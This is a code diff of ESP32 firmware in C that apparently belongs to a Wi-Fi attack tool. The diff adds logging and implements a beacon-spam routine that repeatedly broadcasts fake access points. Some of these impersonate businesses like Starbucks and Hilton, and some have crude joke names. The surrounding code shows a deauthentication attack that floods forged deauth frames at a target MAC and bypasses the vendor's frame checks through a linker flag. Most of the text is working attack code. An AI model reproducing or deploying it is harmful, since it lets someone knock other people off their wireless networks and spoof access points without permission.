@@ -3,7 +3,10 @@
 #include <freertos/timers.h>
 #include "esp_system.h"
 #include "esp_wifi.h"
+#include "esp_log.h"
 #include "attack.h"
+
+static const char* TAG = "Attack";
 
 // This bypass is needed in order to ignore the error checking that Espressif does
 // The compiler flag "-zmuldefs" must be enabled in order for this to compile
@@ -43,14 +46,19 @@ const uint8_t frame_deauth[] = {
 };
 
 TimerHandle_t handle_deauth;
+TimerHandle_t handle_beacon_spam;
 mac_addr_t target_deauth;
 
 // SoftAP should be initialized before running this.
 void attack_init() {
   handle_deauth = NULL;
+  handle_beacon_spam = NULL;
+  ESP_LOGI(TAG, "Initialized");
 }
 
-void attack_deinit() {}
+void attack_deinit() {
+  ESP_LOGI(TAG, "Unintialized");
+}
 
 void send_beacon(const char ssid[], const mac_addr_t sa) {
   uint8_t frame[sizeof(frame_beacon) + strlen(ssid)];
@@ -69,11 +77,60 @@ void send_beacon(const char ssid[], const mac_addr_t sa) {
   memcpy(frame + BEACON_BSSID_OFFSET, &sa, sizeof(sa));
 
   esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+  ESP_LOGV(TAG, "Beacon sent");
 }
 
-void attack_beacon_spam() {
+static const char* SPAM_SSIDS[] = {
+  "Starbucks Wifi",
+  "McDonalds Wifi",
+  "Hilton Hotel",
+  "Tipton",
+  "University Wifi",
+  "Free Wifi",
+  "FBI Van #5",
+  "Yell Penis For Password",
+  "Something Stinks",
+  "Taco Bell Wifi",
+  "Pickles",
+  "IveCome4UrPikl",
+  "FiveDollarFootLong",
+  "Cool NFT Man",
+  "BeanieWeenie",
+  "PooperScooper"
+};
+
+void timer_beacon_spam(TimerHandle_t xTimer) {
+  mac_addr_t mac;
+  esp_fill_random((void*)&mac, sizeof(mac_addr_t));
+  for(int i = 0; i < (sizeof(SPAM_SSIDS) / sizeof(SPAM_SSIDS[0])); i++) {
+    mac.o6 = i;
+    send_beacon(SPAM_SSIDS[i], mac);
+    ESP_LOGV(TAG, "Beacon packet sent");
+  }
+}
+
+void attack_beacon_spam_start() {
   // TODO: Implement this, idk what I want to do with it yet.
   // Random text SSIDs?
+  ESP_LOGI(TAG, "Starting beacon spam");
+  if (handle_beacon_spam != NULL) {
+    ESP_LOGI(TAG, "Beacon spam already in progress!");
+    return;
+  }
+
+  handle_beacon_spam = xTimerCreate("Beacon Spam", 100 / portTICK_PERIOD_MS, pdTRUE, 0, timer_beacon_spam);
+  xTimerStart(handle_beacon_spam, 0);
+  ESP_LOGD(TAG, "Beacon spam timer created, started");
+  ESP_LOGI(TAG, "Beacon spam started;");
+}
+
+void attack_beacon_spam_stop() {
+  ESP_LOGI(TAG, "Stopping beacon spam");
+  xTimerStop(handle_beacon_spam, 0);
+  xTimerDelete(handle_beacon_spam, 0);
+  handle_beacon_spam = NULL;
+  ESP_LOGD(TAG, "Beacon spam timer stopped, deleted");
+  ESP_LOGI(TAG, "Beacon spam stopped");
 }
 
 void send_deauth(const mac_addr_t sa) {
@@ -85,6 +142,7 @@ void send_deauth(const mac_addr_t sa) {
   memcpy(frame + DEAUTH_BSSID_OFFSET, &sa, sizeof(sa));
 
   esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+  ESP_LOGV(TAG, "Deauth packet sent");
 }
 
 void timer_deauth(TimerHandle_t xTimer) {
@@ -92,22 +150,27 @@ void timer_deauth(TimerHandle_t xTimer) {
   for(uint8_t i=0; i < 64; i++) {
     send_deauth(target_deauth);
   }
+  ESP_LOGD(TAG, "Deauth timer ran");
 }
 
 void attack_deauth_start(const mac_addr_t sa, uint32_t ms) {
   // If there is already a handle, chances are it's already running
   if (handle_deauth != NULL) {
-    printf("Deauth already in progress!\n");
+    ESP_LOGI(TAG, "Deauth already in progress!");
     return;
   }
   target_deauth = sa;
   // Create and start a timer
   handle_deauth = xTimerCreate("Deauth Spam", ms / portTICK_PERIOD_MS, pdTRUE, 0, timer_deauth);
   xTimerStart(handle_deauth, 0);
+  ESP_LOGD(TAG, "Deauth timer created, started");
+  ESP_LOGI(TAG, "Deauth attack started");
 }
 
 void attack_deauth_stop() {
   xTimerStop(handle_deauth, 0);
   xTimerDelete(handle_deauth, 0);
   handle_deauth = NULL;
+  ESP_LOGD(TAG, "Deauth timer stopped, deleted");
+  ESP_LOGI(TAG, "Deauth attack stopped");
 }
